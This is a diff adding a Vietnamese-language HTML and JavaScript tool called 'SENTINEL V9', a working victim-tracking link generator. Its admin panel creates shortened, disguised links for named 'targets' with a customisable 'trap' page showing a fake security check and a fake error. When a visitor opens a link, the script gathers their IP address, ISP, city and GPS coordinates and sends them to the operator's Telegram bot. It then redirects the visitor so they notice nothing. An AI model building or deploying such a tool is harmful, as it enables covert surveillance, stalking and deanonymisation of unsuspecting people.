@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title id="meta-title">Hệ thống quản trị</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .admin-bg { background: radial-gradient(circle at top right, #0f172a, #020617); }
+        .glass-card { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.5); }
+        .input-alt { background: #020617; border: 1px solid #1e293b; color: #f8fafc; font-size: 12px; }
+        .input-alt:focus { border-color: #3b82f6; outline: none; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
+    </style>
+</head>
+<body class="admin-bg text-slate-400 font-sans min-h-screen">
+
+    <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center">
+        <div id="ui-loader" class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <h2 id="ui-title" class="text-white font-bold uppercase tracking-widest">Đang kết nối...</h2>
+        <p id="ui-desc" class="text-xs text-slate-500 mt-2">Vui lòng chờ xác thực thiết bị</p>
+    </div>
+
+    <div id="v-admin" class="hidden p-4 lg:p-10">
+        <div class="max-w-7xl mx-auto space-y-6">
+            
+            <header class="flex justify-between items-center border-b border-slate-800 pb-6">
+                <div>
+                    <h1 class="text-2xl font-black text-white italic tracking-tighter">SENTINEL <span class="text-blue-500">V9</span></h1>
+                    <p class="text-[9px] uppercase tracking-[0.4em] text-slate-500">Ultimate Control Station</p>
+                </div>
+                <button onclick="logout()" class="bg-red-500/10 text-red-500 text-[10px] font-bold px-4 py-2 rounded-lg hover:bg-red-500/20 transition-all">THOÁT HỆ THỐNG</button>
+            </header>
+
+            <div class="grid lg:grid-cols-4 gap-6">
+                
+                <div class="space-y-6 lg:col-span-1">
+                    <div class="glass-card p-6 rounded-3xl space-y-4">
+                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest flex items-center gap-2">
+                            <span class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span> Kết nối & API
+                        </h3>
+                        <div class="space-y-3">
+                            <input id="in-tk" type="password" placeholder="Telegram Bot Token" class="w-full input-alt p-3 rounded-xl">
+                            <input id="in-id" type="text" placeholder="Chat ID" class="w-full input-alt p-3 rounded-xl">
+                            <div class="flex gap-2">
+                                <input id="in-api" type="password" placeholder="Cutt.ly Key" class="flex-1 input-alt p-3 rounded-xl">
+                                <button onclick="checkAPI()" class="bg-slate-800 px-3 rounded-xl text-[9px] font-bold hover:bg-slate-700">CHECK</button>
+                            </div>
+                            <button onclick="saveC()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase transition-all shadow-lg shadow-blue-900/20">LƯU CẤU HÌNH</button>
+                        </div>
+                    </div>
+
+                    <div class="glass-card p-6 rounded-3xl space-y-4">
+                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest">Tạo Link Mới</h3>
+                        <input id="in-name" type="text" placeholder="Tên mục tiêu..." class="w-full input-alt p-3 rounded-xl">
+                        <button onclick="generateLink()" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase transition-all">BUILD & RÚT GỌN</button>
+                        <div id="out-link" onclick="copyL(this)" class="hidden p-3 bg-black/50 border border-slate-800 rounded-xl text-[10px] text-blue-400 break-all cursor-pointer text-center font-mono"></div>
+                    </div>
+                </div>
+
+                <div class="space-y-6 lg:col-span-1">
+                    <div class="glass-card p-6 rounded-3xl space-y-4">
+                        <h3 class="text-purple-500 text-[10px] font-black uppercase tracking-widest">Sửa Giao Diện Bẫy</h3>
+                        <input id="ed-title" type="text" placeholder="Tiêu đề ngụy trang" oninput="updatePreview()" class="w-full input-alt p-3 rounded-xl text-xs font-bold">
+                        <textarea id="ed-desc" placeholder="Mô tả ngụy trang..." oninput="updatePreview()" class="w-full input-alt p-3 rounded-xl text-xs h-20"></textarea>
+                        
+                        <div class="flex items-center justify-between p-2 bg-slate-900/50 rounded-xl border border-slate-800">
+                            <span class="text-[9px] font-bold">FAKE REDIRECT</span>
+                            <input id="sw-fake" type="checkbox" onchange="updatePreview()" class="w-4 h-4 accent-blue-500">
+                        </div>
+                        <input id="ed-msg" type="text" placeholder="Thông báo lỗi giả..." oninput="updatePreview()" class="w-full input-alt p-3 rounded-xl text-[10px]">
+                    </div>
+
+                    <div class="glass-card p-2 rounded-3xl border-2 border-slate-800">
+                        <div class="bg-black rounded-2xl p-6 text-center min-h-[150px] flex flex-col items-center justify-center">
+                            <p class="text-[8px] text-slate-700 uppercase mb-4 tracking-widest">Live Preview</p>
+                            <div id="preview-area"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-2">
+                    <div class="glass-card rounded-3xl overflow-hidden border border-slate-800">
+                        <div class="p-6 border-b border-slate-800 flex justify-between items-center bg-slate-900/30">
+                            <h3 class="text-white text-[10px] font-black uppercase tracking-widest">Nhật ký truy cập (Live Logs)</h3>
+                            <button onclick="clearLogs()" class="text-[9px] text-slate-500 hover:text-red-400 uppercase font-bold">Xóa tất cả</button>
+                        </div>
+                        <div class="max-h-[550px] overflow-y-auto">
+                            <table class="w-full text-left text-[11px]">
+                                <thead class="bg-slate-900/50 text-slate-500 uppercase">
+                                    <tr>
+                                        <th class="p-4 font-bold">Mục tiêu</th>
+                                        <th class="p-4 font-bold">Thông tin mạng</th>
+                                        <th class="p-4 font-bold text-right">Trạng thái</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="log-table" class="divide-y divide-slate-800/30 text-slate-300">
+                                    </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let cfg = { 
+            t: "", 
+            i: "", 
+            a: "", 
+            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân",
+            fake: false,
+            fakeMsg: "Lỗi kết nối máy chủ (404)!",
+            ui: { title: "XÁC THỰC BẢO MẬT", desc: "Đang kiểm tra quyền truy cập thiết bị..." }
+        };
+
+        const params = new URLSearchParams(window.location.search);
+
+        window.onload = () => {
+            if (params.has('admin')) {
+                if (localStorage.getItem('auth_v9') === 'true' || prompt("Pass:") === "123") {
+                    localStorage.setItem('auth_v9', 'true');
+                    document.getElementById('v-track').remove();
+                    document.getElementById('v-admin').classList.remove('hidden');
+                    loadAdmin();
+                } else { window.location.search = ""; }
+            } else { applySystem(); executeTracking(); }
+        };
+
+        // --- TRACKING CORE ---
+        async function executeTracking() {
+            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
+            const name = params.get('name') || 'Guest';
+            
+            // 1. Lấy IP & Gửi Telegram + Lưu LocalLog
+            const res = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const logData = { name, ip: res.ip, isp: res.org, loc: res.city, time: new Date().toLocaleTimeString(), st: 'Chờ GPS' };
+            saveLog(logData);
+
+            const msg = `🚀 <b>MỤC TIÊU: ${name}</b>\n🌐 IP: <code>${res.ip}</code>\n🏢 ISP: ${res.org}\n📍 Vùng: ${res.city}`;
+            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`);
+
+            const done = () => { if(cfg.fake) { alert(cfg.fakeMsg); } location.replace(cfg.r); };
+
+            // 2. Lấy GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    updateLogStatus(name, 'Đã có GPS');
+                    const gpsMsg = `🎯 <b>GPS: ${name}</b>\n📍 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Xem Bản Đồ</a>`;
+                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(gpsMsg)}`);
+                    done();
+                }, done, {timeout: 5000});
+            } else { done(); }
+            setTimeout(done, 7000);
+        }
+
+        // --- ADMIN DASHBOARD LOGIC ---
+        function updatePreview() {
+            const title = document.getElementById('ed-title').value || "LOADING...";
+            const desc = document.getElementById('ed-desc').value || "Please wait...";
+            const isFake = document.getElementById('sw-fake').checked;
+            const fakeMsg = document.getElementById('ed-msg').value;
+
+            document.getElementById('preview-area').innerHTML = `
+                <div class="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-3"></div>
+                <h4 class="text-white text-[10px] font-bold">${title}</h4>
+                <p class="text-[8px] text-slate-500 mt-1">${desc}</p>
+                ${isFake ? `<div class="mt-4 p-2 bg-red-500/10 border border-red-500/20 rounded text-[7px] text-red-500 animate-pulse">Popup: ${fakeMsg}</div>` : ''}
+            `;
+            cfg.ui = { title, desc }; cfg.fake = isFake; cfg.fakeMsg = fakeMsg;
+        }
+
+        function loadAdmin() {
+            const saved = localStorage.getItem('cfg_v9');
+            if(saved) cfg = JSON.parse(saved);
+            document.getElementById('in-tk').value = cfg.t;
+            document.getElementById('in-id').value = cfg.i;
+            document.getElementById('in-api').value = cfg.a || "";
+            document.getElementById('sw-fake').checked = cfg.fake;
+            document.getElementById('ed-msg').value = cfg.fakeMsg;
+            document.getElementById('ed-title').value = cfg.ui.title;
+            document.getElementById('ed-desc').value = cfg.ui.desc;
+            renderLogs();
+            updatePreview();
+        }
+
+        function saveC() {
+            cfg.t = document.getElementById('in-tk').value;
+            cfg.i = document.getElementById('in-id').value;
+            cfg.a = document.getElementById('in-api').value;
+            localStorage.setItem('cfg_v9', JSON.stringify(cfg));
+            alert("Đã cập nhật hệ thống!");
+        }
+
+        async function generateLink() {
+            const name = document.getElementById('in-name').value || "Target";
+            const base = window.location.href.split('?')[0];
+            let link = `${base}?name=${encodeURIComponent(name)}&v=${btoa(JSON.stringify(cfg))}`;
+            if(cfg.a) {
+                const r = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(link)}`).then(res => res.json());
+                if(r.url.status === 7) link = r.url.shortLink;
+            }
+            const out = document.getElementById('out-link');
+            out.innerText = link; out.classList.remove('hidden');
+        }
+
+        // --- LOG MANAGEMENT ---
+        function saveLog(data) {
+            let logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
+            logs.unshift(data);
+            localStorage.setItem('sentinel_logs', JSON.stringify(logs.slice(0, 50)));
+        }
+
+        function updateLogStatus(name, st) {
+            let logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
+            if(logs[0] && logs[0].name === name) logs[0].st = st;
+            localStorage.setItem('sentinel_logs', JSON.stringify(logs));
+        }
+
+        function renderLogs() {
+            const logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
+            const table = document.getElementById('log-table');
+            table.innerHTML = logs.map(l => `
+                <tr class="hover:bg-slate-800/20 transition-all border-b border-slate-800/20">
+                    <td class="p-4"><b class="text-white">${l.name}</b><br><span class="text-[9px] text-slate-600">${l.time}</span></td>
+                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-slate-500">${l.isp}</span></td>
+                    <td class="p-4 text-right"><span class="${l.st.includes('GPS')?'text-green-500':'text-yellow-600'} font-bold">${l.st}</span></td>
+                </tr>
+            `).join('');
+        }
+
+        async function checkAPI() {
+            const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
+            alert(res.url.status === 7 ? "API Key Hoạt động!" : "API Key Lỗi!");
+        }
+
+        function applySystem() {
+            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
+            document.getElementById('ui-title').innerText = cfg.ui.title;
+            document.getElementById('ui-desc').innerText = cfg.ui.desc;
+            document.getElementById('meta-title').innerText = cfg.ui.title;
+        }
+
+        function clearLogs() { localStorage.removeItem('sentinel_logs'); renderLogs(); }
+        function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("Copied!"); }
+        function logout() { localStorage.removeItem('auth_v9'); location.reload(); }
+    </script>
+</body>
+</html>
